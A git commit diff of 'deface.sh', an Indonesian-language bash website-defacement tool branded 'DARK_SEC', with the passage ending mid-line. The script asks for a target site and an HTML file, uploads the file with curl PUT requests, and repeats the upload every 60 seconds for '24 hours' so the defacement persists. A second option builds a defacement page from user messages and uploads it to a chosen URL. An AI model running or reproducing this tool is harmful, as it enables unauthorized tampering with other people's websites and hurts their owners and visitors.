d8ced49483f215ab1af894c9da028a38134f0724
Fanky <106883384+fanky86@users.noreply.github.com>
2025-08-30 01:59:12 +0700

    Update deface.sh

--- deface.sh
+++ deface.sh
@@ -1,58 +1,55 @@
 #!/bin/bash
 clear
 
-echo -e '''
-\e[0;35m██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗
-\e[1;36m██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝
-\e[0;35m██║  ██║███████║██████╔╝█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   
-\e[1;36m██║  ██║██╔══██║██╔══██╗██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
-\e[0;35m██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   
-\e[1;36m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
-'''
+echo -e "\e[0;35m██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗"
+echo -e "\e[1;36m██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝"
+echo -e "\e[0;35m██║  ██║███████║██████╔╝█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   "
+echo -e "\e[1;36m██║  ██║██╔══██║██╔══██╗██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   "
+echo -e "\e[0;35m██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   "
+echo -e "\e[1;36m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   "
+echo ""
 
-echo ''
 echo -e '\e[0;32m[\e[0;31m#\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
 echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m1\e[1;33m] \e[0;36mDEFACE 24 JAM               \e[1;33m[\e[1;32m*\e[1;33m]'
 echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m2\e[1;33m] \e[0;36mBUAT SCRIPT HTML            \e[1;33m[\e[1;32m*\e[1;33m]'
 echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31mx\e[1;33m] \e[0;36mKELUAR                      \e[1;33m[\e[1;32m*\e[1;33m]'
 echo -e '\e[0;32m[\e[0;31m#\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
-echo ''
+echo ""
 
-read -p 'root@DARK_SEC ~# ' jj
+read -p $'root@DARK_SEC ~# ' jj
 
-if [ "$jj" = "1" ]; then
+if [[ "$jj" == "1" ]]; then
     read -p $'\e[32mWebsite yang mau di-deface ~> \e[0m' target
     echo -e '\e[1;31mNOTE:\e[0m Jika file HTML berada di folder lain, gunakan path lengkap: /home/kamu/folder/nama_file.html'
-    read -p $'\e[32mScript HTML ~> \e[0m' file
+    read -p $'\e[32mScript HTML (path lengkap) ~> \e[0m' file
 
-    # Buat ulang file login.sh
-    rm -f login.sh
-    cat <<EOF > login.sh
-curl -T "$file" "$target"
-sh conf.sh
-EOF
+    if [[ ! -f "$file" ]]; then
+        echo -e "\e[1;31mFile tidak ditemukan!\e[0m"
+        exit 1
+    fi
 
-    # Buat ulang file conf.sh
-    rm -f conf.sh
-    cat <<EOF > conf.sh
-bash login.sh
-EOF
+    echo -e "\e[1;32m[+] Uploading file ke: $target ...\e[0m"
+    
+    curl -T "$file" "$target"
 
-    echo -e '\n24 JAM TEBAS DIMULAI!'
+    echo -e '\n\e[1;32m24 JAM TEBAS DIMULAI!\e[0m'
     echo 'Situs Anda tidak akan dideface orang lain!'
     echo 'Silakan tidur dengan tenang :)'
     echo 'JANGAN tutup script ini kalau tidak mau diambil alih orang lain!'
-    
-    bash login.sh
 
-elif [ "$jj" = "2" ]; then
+    # Infinite loop (24 jam)
+    while true; do
+        curl -T "$file" "$target"
+        sleep 60
+    done
+
+elif [[ "$jj" == "2" ]]; then
     read -p $'\e[32mNama Anda: \e[0m' user3
     read -p $'\e[32mPesan pertama: \e[0m' pesanf
     read -p $'\e[32mPesan kedua: \e[0m' pesang
     read -p $'\e[32mPesan ketiga: \e[0m' pesanh
     read -p $'\e[32mPesan keempat: \e[0m' pesanj
 
-    rm -f index.html
     cat <<EOF > index.html
 <html>
 <head>
@@ -118,17 +115,15 @@ startTyping(text, delay, destination);
 </html>
 EOF
 
+    echo -e "\e[1;32m[✔] File 'index.html' berhasil dibuat!\e[0m"
     read -p 'Sekalian deface sekarang? (y/t): ' y
     if [[ "$y" == "y" || "$y" == "Y" ]]; then
-        bash dark_script.sh
+        read -p $'\e[32mTarget upload URL ~> \e[0m' target_url
+        curl -T index.html "$target_url"
+        echo -e "\e[1;32m[✔] File berhasil diupload ke $target_url\e[0m"
     else
         echo 'Bye!'
         exit
     fi
 
-elif [[ "$jj" == "x" || "$jj" == "X" ]]; then
-    echo 'Bye!'
-    exit
-else
-    echo "Opsi tidak dikenali."
-fi
+elif [[ "$jj" == "x" || "$jj" == "X
